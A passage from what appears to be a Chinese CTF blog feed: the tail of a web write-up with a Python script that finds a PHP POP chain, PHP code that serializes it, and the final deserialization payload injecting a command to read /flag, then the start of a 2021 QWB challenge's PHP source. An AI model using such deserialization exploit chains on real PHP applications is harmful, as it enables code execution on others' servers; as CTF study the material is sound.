class="hljs-string">&quot;dgkACH&quot;</span>,<span class="hljs-string">&quot;wWVqKa&quot;</span>]<span class="hljs-comment">#这个地方需要自己测试找出来不符合的函数</span><br><br>pop_chain = []<br>pop_chain.append(func_name)<br>e = <span class="hljs-literal">False</span><br><span class="hljs-keyword">while</span>(e <span class="hljs-keyword">is</span> <span class="hljs-literal">False</span>):<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> target.nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == Method):<br>            <span class="hljs-keyword">if</span> node.name == func_name:<br>                <span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode) == MethodCall:<br>                        <span class="hljs-comment"># print(subnode)</span><br>                        <span class="hljs-keyword">if</span>(subnode.name <span class="hljs-keyword">in</span> skip_func):<br>                            <span class="hljs-keyword">continue</span><br>                        target = functions[subnode.name]<br>                        func_name = subnode.name<br>                        pop_chain.append(func_name)<br>                        <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(subnode) == If):<br>                        <span class="hljs-comment"># print(subnode)</span><br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(subnode.node) == MethodCall :<br>                        <span class="hljs-comment"># print(subnode.node.name)</span><br>                            <span class="hljs-keyword">if</span>( subnode.node.name <span class="hljs-keyword">in</span> skip_func):<br>                                <span class="hljs-keyword">continue</span><br>                            target = functions[subnode.node.name]<br>                            func_name = subnode.node.name<br>                            pop_chain.append(func_name)<br>                            <span class="hljs-keyword">break</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">type</span>(subnode) == Eval):<br>                        e = <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(pop_chain)<br><span class="hljs-comment"># pop_chain = [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;, &#x27;xG4zKc&#x27;,</span><br><span class="hljs-comment">#  &#x27;HgZWAg&#x27;, &#x27;HPwuDl&#x27;, &#x27;Vhw4qk&#x27;, &#x27;WLprHX&#x27;, &#x27;UZ6O8X&#x27;, &#x27;wCihxm&#x27;, &#x27;bUm181&#x27;, &#x27;Rcx3e8&#x27;, &#x27;pBcmHG&#x27;, &#x27;yv2r6Y&#x27;, &#x27;Nq02C8&#x27;]</span><br><span class="hljs-keyword">for</span> pop <span class="hljs-keyword">in</span> pop_chain:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;class &quot;</span> + functions[pop].name + <span class="hljs-string">&quot;&#123;&quot;</span>)<br>    <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> functions[pop].nodes:<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">type</span>(node) == ClassVariables):<br>            <span class="hljs-keyword">for</span> subnode <span class="hljs-keyword">in</span> node.nodes:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public &quot;</span> + subnode.name + <span class="hljs-string">&#x27;;&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;public function __construct()&#123;&quot;</span>)<br>                <span class="hljs-keyword">if</span> i+<span class="hljs-number">1</span> == <span class="hljs-built_in">len</span>(pop_chain):<br>                     <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;$this-&gt;&quot;</span> + subnode.name[<span class="hljs-number">1</span>:] + <span class="hljs-string">&quot;= new &quot;</span> + functions[pop_chain[i + <span class="hljs-number">1</span>]].name + <span class="hljs-string">&quot;();&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#125;&quot;</span>)<br>    i += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> i == <span class="hljs-built_in">len</span>(pop_chain):<br>        <span class="hljs-keyword">break</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;rivyS9&#x27;, &#x27;mdNq2Z&#x27;, &#x27;LHl965&#x27;, &#x27;E0eLx8&#x27;, &#x27;DuLIOe&#x27;, &#x27;WCe4Tq&#x27;, &#x27;TmAYUb&#x27;, &#x27;LAekG5&#x27;, &#x27;r2q0UF&#x27;, &#x27;C2S8YY&#x27;, &#x27;g5uQo2&#x27;,</span><br><span class="hljs-comment">#  &#x27;KxPhgA&#x27;, &#x27;lsA527&#x27;, &#x27;LRu117&#x27;, &#x27;MFpxq9&#x27;, &#x27;xafXFm&#x27;, &#x27;GsVAVW&#x27;, &#x27;dGcfBB&#x27;, &#x27;YY6r37&#x27;, &#x27;gH4fYy&#x27;, &#x27;U6xl6Q&#x27;, &#x27;eRt60t&#x27;]</span><br><span class="hljs-comment"># F03wGk c3BsKT C2S8YY g5uQo2 mdNq2Z CpBMKR xYClcr rivyS9 sIm1Q9</span><br><span class="hljs-comment"># qMKDLp dgkACH</span><br><span class="hljs-comment"># qqhftt qMKDLp  M7qPV2 dgkACH xG4zKc</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;,</span><br><span class="hljs-comment">#  &#x27;dgkACH&#x27;, &#x27;S8CRbp&#x27;, &#x27;g0Evp1&#x27;, &#x27;FZp1N3&#x27;, &#x27;xkFzHK&#x27;, &#x27;gcVOmb&#x27;, &#x27;ozDZgT&#x27;, &#x27;gHWISY&#x27;, &#x27;c7rQmp&#x27;, &#x27;HwiCXY&#x27;, &#x27;OfIYHw&#x27;, &#x27;foTwm3&#x27;]</span><br><span class="hljs-comment"># [&#x27;BFda7w&#x27;, &#x27;kfsxbo&#x27;, &#x27;bbT2V6&#x27;, &#x27;LXHQUY&#x27;, &#x27;LQZfK6&#x27;, &#x27;Yrum3T&#x27;, &#x27;i5bTYI&#x27;, &#x27;afD92G&#x27;, &#x27;qqhftt&#x27;, &#x27;M7qPV2&#x27;, &#x27;PUDbGz&#x27;, &#x27;xG4zKc&#x27;,</span><br><span class="hljs-comment">#  &#x27;HgZWAg&#x27;, &#x27;HPwuDl&#x27;, &#x27;Vhw4qk&#x27;, &#x27;WLprHX&#x27;, &#x27;UZ6O8X&#x27;, &#x27;wCihxm&#x27;, &#x27;bUm181&#x27;, &#x27;Rcx3e8&#x27;, &#x27;pBcmHG&#x27;, &#x27;wWVqKa&#x27;, &#x27;qM2mnx&#x27;]</span><br><br><br></code></pre></div></td></tr></table></figure><p>得到pop链，构造payload打</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TPmYmu</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$qfDgtGD</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;qfDgtGD= <span class="hljs-keyword">new</span> z3w6kL();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">z3w6kL</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$X5XSpPz</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;X5XSpPz= <span class="hljs-keyword">new</span> olTmkb();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">olTmkb</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$tTEiXpd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;tTEiXpd= <span class="hljs-keyword">new</span> Moag8l();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moag8l</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$D8ea5Xn</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;D8ea5Xn= <span class="hljs-keyword">new</span> QcHqVE();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QcHqVE</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$XHhuV4y</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;XHhuV4y= <span class="hljs-keyword">new</span> hCG6ag();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">hCG6ag</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$cYnq47g</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;cYnq47g= <span class="hljs-keyword">new</span> EYyxSm();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">EYyxSm</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$A7icng3</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;A7icng3= <span class="hljs-keyword">new</span> CDF5aP();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CDF5aP</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$KUxwPnq</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;KUxwPnq= <span class="hljs-keyword">new</span> a1rktQ();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a1rktQ</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$G2ZqPlg</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;G2ZqPlg= <span class="hljs-keyword">new</span> bPC9aV();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">bPC9aV</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$mUtXpNL</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;mUtXpNL= <span class="hljs-keyword">new</span> lNHRgw();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lNHRgw</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$iI0ggvd</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;iI0ggvd= <span class="hljs-keyword">new</span> uhsLTo();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">uhsLTo</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$V4cm8RE</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;V4cm8RE= <span class="hljs-keyword">new</span> xmFnqe();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xmFnqe</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$XVKtQaL</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;XVKtQaL= <span class="hljs-keyword">new</span> ygWYP5();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ygWYP5</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$BeaCQ8a</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;BeaCQ8a= <span class="hljs-keyword">new</span> kU9NTw();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">kU9NTw</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$Rc3QaRn</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;Rc3QaRn= <span class="hljs-keyword">new</span> gyRrwz();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">gyRrwz</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$ykDFgZf</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;ykDFgZf= <span class="hljs-keyword">new</span> Q2GEHp();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Q2GEHp</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$GgRUaWA</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;GgRUaWA= <span class="hljs-keyword">new</span> cnxShX();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cnxShX</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$lKlVzwp</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;lKlVzwp= <span class="hljs-keyword">new</span> MyFOP4();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyFOP4</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$aIr6pnl</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;aIr6pnl= <span class="hljs-keyword">new</span> TWKFWY();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TWKFWY</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$iMX9NnG</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;iMX9NnG= <span class="hljs-keyword">new</span> ogz6Dr();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ogz6Dr</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$ThhObgx</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;ThhObgx= <span class="hljs-keyword">new</span> QaCgIg();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">QaCgIg</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$gpW7aFB</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;gpW7aFB= <span class="hljs-keyword">new</span> Zg0xg5();<br>&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Zg0xg5</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$p4epegQ</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><br>&#125;<br>&#125;<br><span class="hljs-keyword">echo</span> serialize(<span class="hljs-keyword">new</span> TPmYmu());<br><span class="hljs-meta">?&gt;</span><br></code></pre></div></td></tr></table></figure><p>payload为</p><p><code>?pop=O:6:&quot;TPmYmu&quot;:1:&#123;s:7:&quot;qfDgtGD&quot;;O:6:&quot;z3w6kL&quot;:1:&#123;s:7:&quot;X5XSpPz&quot;;O:6:&quot;olTmkb&quot;:1:&#123;s:7:&quot;tTEiXpd&quot;;O:6:&quot;Moag8l&quot;:1:&#123;s:7:&quot;D8ea5Xn&quot;;O:6:&quot;QcHqVE&quot;:1:&#123;s:7:&quot;XHhuV4y&quot;;O:6:&quot;hCG6ag&quot;:1:&#123;s:7:&quot;cYnq47g&quot;;O:6:&quot;EYyxSm&quot;:1:&#123;s:7:&quot;A7icng3&quot;;O:6:&quot;CDF5aP&quot;:1:&#123;s:7:&quot;KUxwPnq&quot;;O:6:&quot;a1rktQ&quot;:1:&#123;s:7:&quot;G2ZqPlg&quot;;O:6:&quot;bPC9aV&quot;:1:&#123;s:7:&quot;mUtXpNL&quot;;O:6:&quot;lNHRgw&quot;:1:&#123;s:7:&quot;iI0ggvd&quot;;O:6:&quot;uhsLTo&quot;:1:&#123;s:7:&quot;V4cm8RE&quot;;O:6:&quot;xmFnqe&quot;:1:&#123;s:7:&quot;XVKtQaL&quot;;O:6:&quot;ygWYP5&quot;:1:&#123;s:7:&quot;BeaCQ8a&quot;;O:6:&quot;kU9NTw&quot;:1:&#123;s:7:&quot;Rc3QaRn&quot;;O:6:&quot;gyRrwz&quot;:1:&#123;s:7:&quot;ykDFgZf&quot;;O:6:&quot;Q2GEHp&quot;:1:&#123;s:7:&quot;GgRUaWA&quot;;O:6:&quot;cnxShX&quot;:1:&#123;s:7:&quot;lKlVzwp&quot;;O:6:&quot;MyFOP4&quot;:1:&#123;s:7:&quot;aIr6pnl&quot;;O:6:&quot;TWKFWY&quot;:1:&#123;s:7:&quot;iMX9NnG&quot;;O:6:&quot;ogz6Dr&quot;:1:&#123;s:7:&quot;ThhObgx&quot;;O:6:&quot;QaCgIg&quot;:1:&#123;s:7:&quot;gpW7aFB&quot;;O:6:&quot;Zg0xg5&quot;:1:&#123;s:7:&quot;p4epegQ&quot;;N;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#125;&amp;argv=sytem(&quot;cat /flag&quot;);//</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯</title>
    <link href="/2021/07/12/2021-7-12-QWB/"/>
    <url>/2021/07/12/2021-7-12-QWB/</url>
    
    <content type="html"><![CDATA[<h2 id="强网先锋寻宝"><a href="#强网先锋寻宝" class="headerlink" title="强网先锋寻宝"></a>强网先锋寻宝</h2><p>源码</p><figure class="highlight php"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>header(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br>error_reporting(<span class="hljs-number">0</span>);<br>highlight_file(<span class="hljs-keyword">__file__</span>);<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filter_word</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;index&#x27;</span>,<span class="hljs-string">&#x27;KeY1lhv&#x27;</span>,<span class="hljs-string">&#x27;source&#x27;</span>,<span class="hljs-string">&#x27;key&#x27;</span>,<span class="hljs-string">&#x27;eval&#x27;</span>,<span class="hljs-string">&#x27;echo&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\(&#x27;</span>,<span class="hljs-string">&#x27;\.&#x27;</span>,<span class="hljs-string">&#x27;num&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;\/&#x27;</span>,<span class="hljs-string">&#x27;\,&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;0000000&#x27;</span>);<br>        <span class="hljs-variable">$filter_phrase</span>= <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$filter_word</span>).<span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-variable">$filter_phrase</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$string</span>);<br>    &#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$ppp</span>)&#123;<br>    <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$ppp</span>);<br>&#125;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number1&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number2&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;nunber3&#x27;</span>] = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number4&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br><span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number5&#x27;</span>] = <span class="hljs-string">&#x27;1&#x27;</span>;<br><br>extract(<span class="hljs-variable">$_POST</span>);<br><br><span class="hljs-variable">$num1</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number1&#x27;</span>]);        <br><span class="hljs-variable">$num2</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number2&#x27;</span>]);        <br><span class="hljs-variable">$num3</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number3&#x27;</span>]);        <br><span class="hljs-variable">$num4</span> = filter(<span class="hljs-variable">$ppp</span>[<span class="hljs-string">&#x27;number4&#x27;</span>]);<br><span class="hljs-variable">$num5</span> = filter(<span 